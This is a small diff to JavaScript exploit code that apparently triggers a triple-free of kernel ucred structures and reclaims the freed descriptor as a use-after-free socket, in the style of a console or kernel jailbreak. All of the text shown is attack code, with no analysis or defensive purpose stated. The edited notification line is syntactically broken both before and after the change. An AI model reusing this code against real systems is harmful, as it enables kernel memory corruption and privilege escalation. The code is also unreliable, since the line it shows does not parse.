@@ -1430,6 +1430,7 @@ var iov_sock_1 = read32(iov_sv + 4);
 
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 8;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 1000;
+
 function trigger_ucred_triplefree() {
   //log("[TRIGGER] enter trigger_ucred_triplefree");
   var end = false;
@@ -1468,7 +1469,7 @@ function trigger_ucred_triplefree() {
     // 3) reclaim fd → uaf_socket
     send_notification("step 3: start (reclaim fd → uaf_socket)");
     uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("step 3: uaf_socket = " + uaf_socket) done;
+    send_notification("step 3: uaf_socket = " + uaf_socket) done");
 
 
     // 4) free previous ucred
